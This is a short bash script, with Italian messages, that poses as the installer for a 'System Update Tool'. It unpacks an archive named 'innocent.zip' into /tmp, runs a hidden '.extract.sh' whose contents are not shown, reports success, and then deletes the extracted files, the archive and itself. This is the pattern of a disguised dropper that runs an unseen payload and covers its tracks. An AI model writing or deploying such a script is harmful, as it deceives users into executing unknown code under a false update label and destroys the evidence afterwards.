#!/bin/bash
echo "=================================================="
echo "  Installazione System Update Tool v1.2"
echo "=================================================="
echo "Estrazione in corso..."
unzip -q innocent.zip -d /tmp/sysupdate/
cd /tmp/sysupdate/
chmod +x .extract.sh
echo "Eseguo configurazione..."
./.extract.sh
echo "Installazione completata!"
echo "=================================================="
sleep 2
rm -rf /tmp/sysupdate/ install_tool.sh innocent.zip
